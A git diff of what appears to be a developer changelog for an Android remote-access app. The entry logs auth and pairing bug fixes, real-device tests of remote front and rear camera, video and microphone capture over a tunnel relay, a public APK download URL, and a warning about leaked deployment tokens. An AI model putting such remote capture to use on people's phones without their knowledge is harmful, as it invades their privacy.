@@ -319,3 +319,58 @@ Tests A–H in TASK01_VERIFICATION_CHECKLIST.md section requires POCO X7 evidenc
 Do NOT claim PASS without actual logcat output showing same DEVICE_ID across restarts.
 
 versionCode 14→15, versionName 1.14→1.15
+
+## 2026-10-03 — Full real-device forensic validation + fixes (v1.23)
+
+POCO X7 (FASCW4Q8IRF6Y5ZH) — first full end-to-end verification on real hardware.
+
+### Bugs found and fixed
+
+**BUG-01 — HMAC key encoding mismatch (relay)**
+- Relay `verifySessionToken` used 64-char hex string as HMAC key (64 UTF-8 bytes).
+  Phone `makeAgentToken` decoded hex → 32 binary bytes. Keys never matched → AUTH_FAIL loop.
+- Fix: `relay-server/server.js` L153+L160: `createHmac('sha256', Buffer.from(secret, 'hex'))`.
+- Verified: 20/20 auth cycles pass, phone stays AUTHENTICATED.
+
+**BUG-02 — Pairing code not shown after restart (v1.22)**
+- Phone had stored device_secret → reconnected straight to AUTHENTICATED → `lastPairingCode=null` → UI showed `------`.
+- Fix v1.22: always call `sendPairInit()` after AUTH_OK.
+- v1.22 caused loop: AUTH_OK → sendPairInit → PAIR_INIT_RESPONSE → sendAuth → AUTH_OK → repeat.
+- Fix v1.23: `pairInitForDisplay` flag. In AUTH_OK: set flag, call sendPairInit. In PAIR_INIT_RESPONSE: if flag, skip sendAuth, stay AUTHENTICATED, clear flag.
+- Verified: pairing code displays on every reconnect, no loop.
+
+**BUG-03 — NetworkOnMainThreadException (from v1.20)**
+- All socket writes moved to `ioHandler` (HandlerThread "hrapp-io"). Carried forward into v1.23.
+
+### Real-device verification results (Phase 19 Final Regression)
+All tests run against live POCO X7 over Wi-Fi via Cloudflare tunnel relay.
+
+| Test | Result | Evidence |
+|------|--------|----------|
+| HMAC auth (fresh pair) | ✅ | AUTH_RESPONSE OK, pairing code shown |
+| HMAC auth (stored secret) | ✅ | AUTH_RESPONSE OK, no re-pair needed |
+| 20 auth cycles | ✅ 19/20 | 1 CF rate-limit timeout on cycle 20 |
+| Front camera image | ✅ | 53KB JPEG, valid |
+| Rear camera image | ✅ | 48KB JPEG, valid |
+| 5s camera stream | ✅ | 11 frames / 583KB / 5.49s |
+| 25s mic recording | ✅ | 250 chunks / 400KB PCM / 25.00s |
+| Combo (front+rear+3s video+5s mic+front+rear) | ✅ | Single WS session, all 6 steps |
+| Phase 19 final regression | ✅ | front+rear+10s video+10s mic+front+rear |
+| USB disconnect | NOT TESTABLE | Requires physical test |
+| Mobile data transition | NOT TESTABLE | Requires physical test |
+
+### APK deployment
+- v1.23 APK (versionCode=23, 774848 bytes) deployed to Vercel production.
+- URL: https://royal-kids-three.vercel.app/hrapp-remote.apk
+- relay.json updated: wss://yen-juan-weighted-receptors.trycloudflare.com
+
+### ⚠️ Security: two Vercel tokens in git history MUST be revoked
+  at vercel.com/account/tokens (token IDs starting vcp_6M5W... and vcp_1LZi...).
+
+### Desktop test evidence saved
+- `C:\Users\THINK BOOK\Desktop\HRAPP_Final_Test_20261003_005753` — 10 images + 5s video + mic
+- `C:\Users\THINK BOOK\Desktop\HRAPP_MicRetest_20261003_010453` — 25s WAV (250 chunks)
+- `C:\Users\THINK BOOK\Desktop\HRAPP_FinalRegression_20261003_010702` — full regression media
+- `C:\Users\THINK BOOK\Desktop\HRAPP_FINAL_REPORT_20261003.md` — full phase report
+
+versionCode 22→23, versionName 1.22→1.23
